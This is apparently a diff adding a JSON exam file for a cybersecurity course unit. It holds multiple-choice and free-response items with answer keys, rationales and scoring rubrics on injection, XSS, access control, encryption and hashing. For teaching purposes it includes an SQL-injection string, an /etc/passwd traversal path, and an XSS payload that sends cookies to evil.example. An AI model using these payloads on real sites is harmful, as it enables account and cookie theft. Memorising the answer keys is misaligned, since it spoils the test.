@@ -1,0 +1,438 @@
+{
+  "meta": { "unitId": "Unit 5", "title": "Securing Applications and Data", "unitLabel": "Unit 5 • Securing Applications and Data" },
+  "timeMinutes": 60,
+  "partI": {
+    "instructions": "Choose the single best answer.",
+    "questions": [
+      {
+        "id": "Q1",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A help-desk technician's standard account is given administrative privileges so they can install software quickly. An adversary later phishes that technician's password. Why does the CED treat this setup as especially dangerous?",
+        "options": [
+          "Administrative users can control system settings and access nearly any files or applications, so the adversary now has elevated privileges",
+          "Standard users are unable to log in at all once an administrator account exists on the same machine",
+          "Encryption keys are automatically deleted whenever a standard user is promoted to an administrator",
+          "Phished passwords are useless against administrative accounts and only work on guest accounts"
+        ],
+        "answer": "A",
+        "ek": "EK 5.1.A.2",
+        "rationale": "5.1.A.2 explains that administrative users can control system settings and typically access any files or applications; if a regular user has administrative privileges and the adversary compromises that account, the adversary gains elevated privileges on the system."
+      },
+      {
+        "id": "Q2",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "On a login form, an attacker types ' OR 1=1 -- into the username field, and the application returns every account record in the database. Which attack and which CED impact does this BEST illustrate?",
+        "options": [
+          "A directory traversal attack, causing the server to jam all incoming GET requests",
+          "An SQL-injection attack, causing a breach of confidentiality by returning more information than it should",
+          "A buffer overflow attack, causing the database to encrypt itself with a new symmetric key",
+          "A cross-site scripting attack, causing JavaScript to run inside the database server's kernel"
+        ],
+        "answer": "B",
+        "ek": "EK 5.1.B.4",
+        "rationale": "5.1.B.4 says an SQL-injection attack places SQL commands and control characters into a user-input field, which can cause a breach of confidentiality by making the application return more information than it should, or a breach of integrity by modifying or deleting data."
+      },
+      {
+        "id": "Q3",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "An adversary posts a comment containing <script>...</script> on a public forum, and the script runs in the browser of every later visitor to that page. According to the CED, which kind of attack is this?",
+        "options": [
+          "A reflected (Type I) XSS attack, since the code only runs for the single user who posted it",
+          "A directory traversal attack, since the comment modifies the server's file paths",
+          "A stored (Type II) XSS attack, since the injected code affects any user visiting the website",
+          "An SQL-injection attack, since the comment field queries a database with control characters"
+        ],
+        "answer": "C",
+        "ek": "EK 5.1.B.6",
+        "rationale": "5.1.B.6 says a stored (Type II) XSS attack is inserted onto a website through a comment field, forum post, or visitor log, which affects any user visiting that website; a reflected (Type I) attack is embedded in a link the user clicks."
+      },
+      {
+        "id": "Q4",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A web server stores images in /var/www/images/, and an analyst sees a request for ../../../etc/passwd in the server log. What is the adversary attempting, per the CED?",
+        "options": [
+          "To overflow a fixed-size memory buffer and crash the image-serving process",
+          "To inject JavaScript that steals cryptographic keys stored in the visitor's browser",
+          "To classify the data at rest so that it can be encrypted with a longer key",
+          "To use modified GET requests to reach sensitive files like the list of authorized usernames"
+        ],
+        "answer": "D",
+        "ek": "EK 5.1.B.10",
+        "rationale": "5.1.B.10 and its illustrative example describe a directory traversal attack: adversaries modify URLs and GET requests with ../ sequences to move up the filesystem and reach sensitive files such as /etc/passwd, which lists authorized usernames."
+      },
+      {
+        "id": "Q5",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A defense contractor stores the technical specifications for a new Air Force jet engine on a single unencrypted drive. Using the CED's risk framework, how should this be rated?",
+        "options": [
+          "A high risk, since highly sensitive data could be compromised through a highly likely exploit",
+          "A low risk, since the specifications are routine documents protected by short keys",
+          "A moderate risk, since the data merely lack strict enough access controls",
+          "No meaningful risk, since unencrypted drives cannot be read by an adversary"
+        ],
+        "answer": "A",
+        "ek": "EK 5.1.C.2",
+        "rationale": "5.1.C.2 says high risks often involve highly sensitive data that could be compromised through a highly likely exploit; the illustrative example is exactly the jet-engine specifications stored on an unencrypted drive."
+      },
+      {
+        "id": "Q6",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A team is deciding how strongly to protect three data sets: a backup being copied over a cable, records sitting on a disk, and a spreadsheet open and being edited. The third set must be unencrypted while the editor works on it. Which CED data-state concept explains why?",
+        "options": [
+          "Data at rest must always remain unencrypted so the drive can be physically inspected",
+          "Data in transit cannot be encrypted while it is moving across physical media",
+          "Data in use are being processed by software or a person and must be unencrypted to be used",
+          "Data in use are the only state that can never be protected by any access control"
+        ],
+        "answer": "C",
+        "ek": "EK 5.2.A.2",
+        "rationale": "5.2.A.2 classifies data by state and states that data in use are being processed by software or a person and must be unencrypted to be used, while access controls can limit who may view or edit them."
+      },
+      {
+        "id": "Q7",
+        "kind": "recall",
+        "stem": "Which CED description correctly matches a regulated data category with the data it covers?",
+        "options": [
+          "Payment card information (PCI) covers test results, treatment records, and doctor visit notes",
+          "Protected health information (PHI) covers a card's account number, expiration date, and CVV code",
+          "Personally identifiable information (PII) is limited strictly to a person's username and password",
+          "Personally identifiable information (PII) includes name, address, biometric data, and social security number"
+        ],
+        "answer": "D",
+        "ek": "EK 5.2.A.4",
+        "rationale": "5.2.A.4 defines PII as data that allows someone to be identified, including name, signature, phone number, address, biometric data, social security number, date of birth, and email address. PHI is health data and PCI is card payment data."
+      },
+      {
+        "id": "Q8",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A hospital sets a policy that lists approved encryption algorithms, minimum key lengths, and how cryptographic keys must be generated and stored. Which managerial control from the CED is this?",
+        "options": [
+          "A web application security policy governing vulnerability testing timelines",
+          "A discretionary access control list set by individual file owners",
+          "A cryptography policy describing acceptable encryption protocols and key parameters",
+          "A mandatory access control level assigned by an external administrator"
+        ],
+        "answer": "C",
+        "ek": "EK 5.2.B.1",
+        "rationale": "5.2.B.1 says a cryptography policy describes acceptable encryption protocols and key parameters and may include approved algorithms, minimum or maximum key lengths, and key-generation and key-storage requirements."
+      },
+      {
+        "id": "Q9",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A company wants payroll software accessible only to people assigned the job function of 'accountant,' and access should follow the function rather than the individual. Which access control model fits BEST?",
+        "options": [
+          "Discretionary access control (DAC), where each owner sets access on objects they own",
+          "Role-based access control (RBAC), where subjects are assigned roles that define their access",
+          "Mandatory access control (MAC), where an external administrator assigns subject and object levels",
+          "Rule-based access control (RuBAC), where access depends on time-of-day rules layered on top"
+        ],
+        "answer": "B",
+        "ek": "EK 5.2.C.2",
+        "rationale": "5.2.C.2 says role-based access control (RBAC) assigns every subject to a role and defines which roles have which access; the illustrative example is granting only subjects in the 'accountant' role access to the payroll software."
+      },
+      {
+        "id": "Q10",
+        "kind": "recall",
+        "stem": "The Bell-LaPadula model summarizes its two properties as 'write up, read down' (WURD). Which CED statement captures these properties correctly?",
+        "options": [
+          "Subjects may not read objects above their level and may not write to objects below their level",
+          "Subjects may freely read and write any object regardless of their assigned level",
+          "Subjects may read objects above their level but never read objects at their own level",
+          "Subjects set their own levels and grant other subjects access to objects they own"
+        ],
+        "answer": "A",
+        "ek": "EK 5.2.C.6",
+        "rationale": "5.2.C.6 states the Simple Security Property (subjects may not read objects above their level) and the * (Star) Security Property (subjects may not write to objects below their level), summarized as 'write up, read down.'"
+      },
+      {
+        "id": "Q11",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "On a Linux system, an administrator runs chmod 750 report. What permissions does this grant, according to the CED's numeric method?",
+        "options": [
+          "Owner gets write and execute, group gets read only, others get read and write",
+          "Owner gets read and execute, group gets read, write, and execute, others get no access",
+          "Owner gets read, write, and execute; group gets read and execute; others get no access",
+          "All three entities get read, write, and execute access to the file report"
+        ],
+        "answer": "C",
+        "ek": "EK 5.2.D.6",
+        "rationale": "5.2.D.6 explains that 7 = read+write+execute, 5 = read+execute, and 0 = no permissions; the illustrative example states chmod 750 sets owner to read/write/execute, group to read/execute, and others to no access."
+      },
+      {
+        "id": "Q12",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A manager argues that giving every employee full access 'just in case' keeps the team flexible. Which CED principle most directly contradicts this, and what does it require?",
+        "options": [
+          "The principle of least privilege, which gives entities exactly as much access as they need and no more",
+          "The secure-by-default principle, which requires every file to start with read, write, and execute for all",
+          "The accounting principle, which requires every employee to share one administrative account",
+          "The data-validation principle, which requires that all employees be able to edit input fields"
+        ],
+        "answer": "A",
+        "ek": "EK 5.2.C.7",
+        "rationale": "5.2.C.7 defines the principle of least privilege as the idea that entities should be given exactly as much access as they need to perform their function and no more, which directly opposes granting blanket access."
+      },
+      {
+        "id": "Q13",
+        "kind": "recall",
+        "stem": "According to the CED, what is the relationship between plaintext, ciphertext, and a key in an encryption algorithm?",
+        "options": [
+          "Plaintext is the encrypted output, ciphertext is the original message, and the key is discarded",
+          "An encryption algorithm combines the plaintext with a predefined key, producing ciphertext as output",
+          "Ciphertext is combined with a hash to recover the keyspace before any key is used",
+          "Plaintext and ciphertext are identical whenever a symmetric algorithm is used"
+        ],
+        "answer": "B",
+        "ek": "EK 5.3.A.2",
+        "rationale": "5.3.A.2 states that an encryption algorithm combines the information to be encrypted (the plaintext) with a predefined key, and the output of the algorithm is the ciphertext."
+      },
+      {
+        "id": "Q14",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "Two analysts compare encryption choices. One says a larger keyspace makes a cipher harder to break by guessing. Which CED idea supports that claim?",
+        "options": [
+          "A smaller keyspace forces the adversary to try every possible plaintext instead of keys",
+          "The keyspace shrinks as key length grows, which is what slows down an adversary",
+          "The keyspace measures how many files a single key can encrypt before it expires",
+          "The keyspace is the number of possible keys, and a larger keyspace takes longer to guess by random chance"
+        ],
+        "answer": "D",
+        "ek": "EK 5.3.A.3",
+        "rationale": "5.3.A.3 defines the keyspace as the number of possible keys in an algorithm and notes that the larger the keyspace, the longer it takes an adversary to discover the correct key by random chance."
+      },
+      {
+        "id": "Q15",
+        "kind": "recall",
+        "stem": "Which statement about the Advanced Encryption Standard (AES) matches the CED?",
+        "options": [
+          "AES is an asymmetric algorithm that uses a separate public and private key pair",
+          "AES is the most common symmetric block cipher and encrypts data in 128-bit blocks",
+          "AES processes one bit at a time as a stream cipher and cannot use varying key lengths",
+          "AES is used only for digital signatures and never for Wi-Fi or file encryption"
+        ],
+        "answer": "B",
+        "ek": "EK 5.3.B.1 + EK 5.3.B.2",
+        "rationale": "5.3.B.1 names AES as the most common symmetric encryption algorithm, and 5.3.B.2 says AES is a symmetric key block cipher that encrypts data in 128-bit blocks and can operate with keys of varying lengths."
+      },
+      {
+        "id": "Q16",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "Renata wants people to send her encrypted files without arranging a shared secret in advance. She publishes one key and keeps another secret. How should senders and Renata use the key pair, per the CED?",
+        "options": [
+          "Senders encrypt with Renata's public key, and only Renata's private key can decrypt the files",
+          "Senders encrypt with Renata's private key, which she emails to each sender beforehand",
+          "Senders and Renata both use the same single shared key to encrypt and decrypt",
+          "Renata publishes her private key so anyone can decrypt whatever she receives"
+        ],
+        "answer": "A",
+        "ek": "EK 5.4.A.4",
+        "rationale": "5.4.A.4 says that to send information securely, the sender uses the receiver's public key to encrypt the data, and only the receiver, who holds the private key, can decrypt and read it; 5.4.A.1 notes this needs no prearranged shared secret."
+      },
+      {
+        "id": "Q17",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A student claims that an n-bit binary key has a keyspace of 2 to the n, so adding one bit roughly doubles the work to guess it. Which CED point confirms this?",
+        "options": [
+          "Longer keys produce smaller keyspaces, so each added bit halves the guessing effort",
+          "An n-bit binary key has a keyspace of 2 to the n, so longer keys create larger keyspaces",
+          "Keyspace size is fixed regardless of key length and depends only on the algorithm's name",
+          "An n-bit key can be guessed in exactly n attempts no matter how large n becomes"
+        ],
+        "answer": "B",
+        "ek": "EK 5.4.B.1",
+        "rationale": "5.4.B.1 states that longer keys result in larger keyspaces and that, for binary keys, an n-bit length key has a keyspace of 2 to the n."
+      },
+      {
+        "id": "Q18",
+        "kind": "recall",
+        "stem": "Which pair of algorithms does the CED identify as common asymmetric encryption algorithms used in applications like digital signatures and certificates?",
+        "options": [
+          "AES and SHA-256, both used as symmetric block ciphers",
+          "OpenSSL and AES Crypt, both web-based hashing tools",
+          "Bell-LaPadula and RuBAC, both access control models",
+          "RSA and elliptic curve cryptography (ECC)"
+        ],
+        "answer": "D",
+        "ek": "EK 5.4.C.1",
+        "rationale": "5.4.C.1 says common asymmetric encryption algorithms include RSA and elliptic curve cryptography (ECC), used in many applications including digital signatures and digital certificates."
+      },
+      {
+        "id": "Q19",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A software company decides that security must be a design principle from the first phase of product development, and that shipped devices should arrive with protective features already turned on. Which two CED principles is the company applying?",
+        "options": [
+          "Secure by design and secure by default, building in security early and enabling protections out of the box",
+          "Least privilege and accounting, logging every user action before any feature ships",
+          "Data validation and sanitization, checking only the format of customer input fields",
+          "Block encryption and stream encryption, choosing how the product processes bits"
+        ],
+        "answer": "A",
+        "ek": "EK 5.5.A.1 + EK 5.5.A.3",
+        "rationale": "5.5.A.1 describes secure by design as including security in all phases of development as a design principle, and 5.5.A.3 describes secure by default as having security features enabled out of the box."
+      },
+      {
+        "id": "Q20",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A developer adds a function that inspects user input and strips out single quotes, double quotes, and semicolons before the input is processed. According to the CED, which attacks can this practice help prevent?",
+        "options": [
+          "Jamming attacks, evil twin attacks, and war driving attacks",
+          "SQL injection attacks, XSS attacks, and directory traversal attacks",
+          "Buffer overflow attacks only, since control characters never affect databases",
+          "Phishing attacks and voice-cloning attacks against the development team"
+        ],
+        "answer": "B",
+        "ek": "EK 5.5.B.2",
+        "rationale": "5.5.B.2 says a verification function can sanitize user input by removing potentially malicious control characters, which can protect against many application attacks including SQL injection, XSS, and directory traversal attacks."
+      },
+      {
+        "id": "Q21",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "A security team plants a file named 'employee_passwords.xlsx' that actually holds fake data, and they configure an alert if anyone opens it. Which detective control is this, and why does access signal an attack?",
+        "options": [
+          "A honeypot, since there is no legitimate reason to open a fake file, so any access indicates malicious activity",
+          "A data loss prevention service, since it physically blocks all file transfers across the network",
+          "A cryptographic hash, since opening the file changes its digest and proves tampering occurred",
+          "A mandatory access control level, since the file's classification forbids all reads automatically"
+        ],
+        "answer": "A",
+        "ek": "EK 5.6.A.2",
+        "rationale": "5.6.A.2 defines a honeypot as a file that appears to hold valuable data but contains fake data; since there is no legitimate reason to access it, any attempted access is an indicator of malicious activity and can alert defenders."
+      },
+      {
+        "id": "Q22",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "A small nonprofit wants effective detection on a tight budget but also handles regulated donor financial records. Which CED-based combination of criteria should drive its choice of detective controls?",
+        "options": [
+          "Cost alone, since honeypots and hash checks are inexpensive and replace any need for monitoring sensitive data",
+          "Classification alone, since regulated financial data have no detection or monitoring requirements",
+          "Cost, sensitivity or criticality, and data classification, since regulated and sensitive data warrant closer monitoring",
+          "Key length alone, since longer encryption keys remove the need for any detective controls"
+        ],
+        "answer": "C",
+        "ek": "EK 5.6.B.1 + EK 5.6.B.2 + EK 5.6.B.3",
+        "rationale": "5.6.B.1 lists cost (honeypots and hash checks are inexpensive; DLP costs more but is stronger), 5.6.B.2 lists sensitivity or criticality, and 5.6.B.3 lists classification (regulated data may carry legal monitoring requirements) as criteria for detective controls."
+      },
+      {
+        "id": "Q23",
+        "kind": "scenario",
+        "predictFirst": true,
+        "stem": "An auditor relies solely on file hashing to catch data theft. An adversary copies a sensitive file without changing it. Which CED limitation does this expose?",
+        "options": [
+          "Hashing produces a different digest each time, so it falsely flags unaltered files as stolen",
+          "Hashing can detect only altered data, so copying or viewing a file without changing it goes undetected",
+          "Hashing alerts defenders in real time as the copy happens, stopping the attack mid-transfer",
+          "Hashing requires the file to be encrypted first, so unencrypted files cannot be hashed at all"
+        ],
+        "answer": "B",
+        "ek": "EK 5.6.C.3",
+        "rationale": "5.6.C.3 explains that false negatives can occur because cryptographic hash functions only detect whether data have been altered; an adversary could view or steal data without altering it, and the hash would not reveal it."
+      },
+      {
+        "id": "Q24",
+        "kind": "applied",
+        "predictFirst": true,
+        "stem": "Before deployment, an analyst records the SHA-256 hash of a configuration file. A week later they hash it again and the two values differ. According to the CED, what can they conclude?",
+        "options": [
+          "Nothing, since the same input can produce different hash outputs each run",
+          "The file's encryption key was rotated, which always changes the hash automatically",
+          "The file was altered between when the first and second hashes were generated",
+          "The hashing tool failed, since matching files should produce different digests"
+        ],
+        "answer": "C",
+        "ek": "EK 5.6.D.1 + EK 5.6.D.3",
+        "rationale": "5.6.D.1 says hash functions are repeatable—the same input always produces the same output—and 5.6.D.3 says if a file's hash changes between two hashings, the file was altered in that interval."
+      }
+    ]
+  },
+  "partII": {
+    "instructions": "Answer in complete sentences; cite specific attacks, controls, encryption types, or detection methods.",
+    "questions": [
+      {
+        "id": "FR1",
+        "prompt": "ShopFast runs a web application with a login form and a product-review section. A penetration tester finds two problems. First, typing ' OR 1=1 -- into the username field returns every user's account data. Second, a review saved as <script>document.location='http://evil.example/'+document.cookie</script> runs in the browser of everyone who later views that product page. The development team admits the application passes user input straight into its database queries and stores reviews without any filtering.",
+        "parts": [
+          "(a) Name the attack demonstrated by the username field and explain, in CED terms, what makes the application vulnerable and what impact the attack has.",
+          "(b) Name the attack demonstrated by the saved review, classify its XSS type, and explain why it endangers later visitors.",
+          "(c) Recommend ONE specific input-handling fix that addresses BOTH problems, and justify why it works."
+        ],
+        "points": 9,
+        "sample": [
+          "(a) The username field shows an SQL-injection attack. The application is vulnerable because it queries a database using unvalidated or unsanitized input from users (5.1.B.3); ShopFast passes input straight into its queries. By placing SQL commands and control characters into the input field, the attacker causes a breach of confidentiality—the application returns more information than it should (here, every user's account data), and the same technique could breach integrity by modifying or deleting data (5.1.B.4).",
+          "(b) The saved review is a cross-site scripting (XSS) attack, specifically a stored (Type II) XSS attack because the malicious code was inserted through a comment/review field and is served to anyone who visits the page (5.1.B.6). It endangers later visitors because JavaScript runs in the browser of each visiting user, and such code can access sensitive data stored in the browser like usernames, passwords, cryptographic keys, and—as here—cookies (5.1.B.5).",
+          "(c) ShopFast should add an input sanitization/validation function that verifies user input meets expected criteria and removes or rejects control characters such as the single quote, double quote, and semicolon before the input is processed (5.5.B.1, 5.5.B.2). This single practice protects against multiple application attacks, including SQL injection and XSS, because both rely on injecting control characters or script tags that sanitization strips out or blocks (5.5.B.2)."
+        ],
+        "rubric": [
+          "2 pts: Part (a) names SQL injection and ties the vulnerability to querying with unvalidated/unsanitized input (5.1.B.3).",
+          "1 pt: Part (a) states a correct impact—breach of confidentiality (returning more data than it should) and/or integrity (5.1.B.4).",
+          "2 pts: Part (b) names XSS and correctly classifies it as stored/Type II because a review field serves the code to all later visitors (5.1.B.6).",
+          "1 pt: Part (b) explains the danger—JavaScript runs in the visitor's browser and can access sensitive browser data such as cookies (5.1.B.5).",
+          "3 pts: Part (c) recommends input sanitization/validation that removes or rejects control characters and justifies that it defends against both SQLi and XSS (5.5.B.1, 5.5.B.2)."
+        ],
+        "ek": "EK 5.1.B.3 + EK 5.1.B.4 + EK 5.1.B.5 + EK 5.1.B.6 + EK 5.5.B.1 + EK 5.5.B.2"
+      },
+      {
+        "id": "FR2",
+        "prompt": "MeridianBank must protect two different things. (1) A large archive of customer records sits on a backup drive that is never transmitted; the bank wants strong, fast encryption for these files at rest. (2) Two engineers in different states, who have never met and have no prearranged shared secret, must exchange a few short confidential messages over the internet. The security lead is deciding between symmetric and asymmetric encryption for each case and is also writing key-length guidance.",
+        "parts": [
+          "(a) Recommend symmetric or asymmetric encryption for the archive at rest, name a specific algorithm from the CED, and justify the choice.",
+          "(b) Recommend symmetric or asymmetric encryption for the two engineers' exchange, name a specific algorithm, and explain exactly how they would use the keys to communicate securely.",
+          "(c) Explain, using the CED's keyspace reasoning, why the security lead specifies a longer key, and state one trade-off of doing so."
+        ],
+        "points": 9,
+        "sample": [
+          "(a) For the archive at rest, MeridianBank should use symmetric encryption with the Advanced Encryption Standard (AES). AES is the most common symmetric encryption algorithm and is used for file encryption on disks (5.3.B.1); as a symmetric algorithm it uses the same key to encrypt and decrypt (5.3.A.4), which is efficient for a large volume of data the bank both stores and later reads itself, so no key exchange with an outside party is required.",
+          "(b) For the two engineers, who share no prearranged secret, the bank should use asymmetric encryption with an algorithm such as RSA or ECC (5.4.C.1). Asymmetric encryption lets users communicate securely without prearranging a shared secret key (5.4.A.1). Each engineer generates a key pair and publishes their public key while keeping the private key secure (5.4.A.2, 5.4.A.3). To send a message, the sender encrypts it with the recipient's public key, and only the recipient's matching private key can decrypt and read it (5.4.A.4).",
+          "(c) A longer key creates a larger keyspace—for a binary key, an n-bit key has a keyspace of 2 to the n (5.4.B.1)—and the larger the keyspace, the longer it takes an adversary to discover the correct key by random chance (5.3.A.3); on average an adversary needs about 2 to the (n−1) guesses (5.4.B.2). The trade-off is that longer keys require more time to encrypt and decrypt messages (5.4.B.3, 5.3.B.2)."
+        ],
+        "rubric": [
+          "2 pts: Part (a) chooses symmetric encryption for the at-rest archive and names AES (5.3.B.1).",
+          "1 pt: Part (a) justifies symmetric with same-key efficiency for self-stored bulk data (5.3.A.4).",
+          "2 pts: Part (b) chooses asymmetric and names RSA or ECC, citing no prearranged shared secret (5.4.A.1, 5.4.C.1).",
+          "2 pts: Part (b) explains key use—generate a key pair, share the public key, encrypt with the recipient's public key, decrypt with the private key (5.4.A.2/5.4.A.4).",
+          "2 pts: Part (c) connects longer key to larger keyspace and slower guessing (5.4.B.1/5.3.A.3) AND names the trade-off of slower encrypt/decrypt (5.4.B.3)."
+        ],
+        "ek": "EK 5.3.A.3 + EK 5.3.A.4 + EK 5.3.B.1 + EK 5.4.A.1 + EK 5.4.A.4 + EK 5.4.B.1 + EK 5.4.B.3 + EK 5.4.C.1"
+      },
+      {
+        "id": "FR3",
+        "prompt": "A research lab keeps proprietary formula files on a shared Linux server. The security team wants to (1) tightly limit who can read and change the files, (2) detect if any formula file is secretly altered, and (3) catch intruders who go looking for valuable data. Management also worries that whatever detection they choose might miss some attacks, and they want to understand the limits before relying on it.",
+        "parts": [
+          "(a) Recommend an access-control approach for the formula files, naming the relevant CED principle and showing how a Linux permission setting could enforce 'owner full access, team read-only, everyone else none.'",
+          "(b) Design a file-integrity detection approach using cryptographic hashing, explaining step by step how the team would know a file was altered.",
+          "(c) Add ONE more detection method to catch an intruder hunting for data, then explain a specific blind spot the team must accept, citing the CED's discussion of false negatives."
+        ],
+        "points": 10,
+        "sample": [
+          "(a) The team should apply the principle of least privilege, giving each entity exactly as much access as it needs and no more (5.2.C.7). On the Linux server they can enforce this with chmod using the numeric method, where 4=read, 2=write, 1=execute and the three digits set owner, group, and others (5.2.D.2, 5.2.D.6). For 'owner full access, team read-only, everyone else none,' the command chmod 740 formula sets the owner to read/write/execute (7), the group to read only (4), and all other users to no access (0).",
+          "(b) For integrity, the team should use a cryptographic hash function, which generates a digest that reveals if data have been altered (5.6.A.3). Hash functions are repeatable—the same input always produces the same output (5.6.D.1). The team hashes each formula file and records the output, for example with sha256sum in BASH (5.6.D.2). Later they hash the same file again and compare the new digest to the recorded one; if a file's hash has changed, the file was altered between the two hashings (5.6.D.3).",
+          "(c) To catch an intruder hunting for data, the team can plant a honeypot—a file that appears to hold valuable data but contains fake data—and alert defenders if anyone accesses it, since there is no legitimate reason to open it (5.6.A.2). The team must accept blind spots from false negatives: a cryptographic hash only detects alteration, so an adversary who views or copies a formula file without changing it would not be caught by hashing, and a honeypot cannot detect adversaries who never attempt to access it (5.6.C.3)."
+        ],
+        "rubric": [
+          "2 pts: Part (a) names the principle of least privilege (5.2.C.7).",
+          "2 pts: Part (a) gives a correct chmod setting for owner full / group read / others none, e.g., chmod 740, with values explained (5.2.D.6).",
+          "3 pts: Part (b) describes hashing for integrity—record a hash, re-hash later, compare; a changed hash means the file was altered (5.6.A.3/5.6.D.1/5.6.D.3).",
+          "1 pt: Part (c) adds a valid second detection method such as a honeypot for intruders hunting data (5.6.A.2).",
+          "2 pts: Part (c) explains a specific false-negative blind spot—hashing misses unaltered theft and honeypots miss adversaries that never access them (5.6.C.3)."
+        ],
+        "ek": "EK 5.2.C.7 + EK 5.2.D.6 + EK 5.6.A.2 + EK 5.6.A.3 + EK 5.6.D.1 + EK 5.6.D.3 + EK 5.6.C.3"
+      }
+    ]
+  }
+}
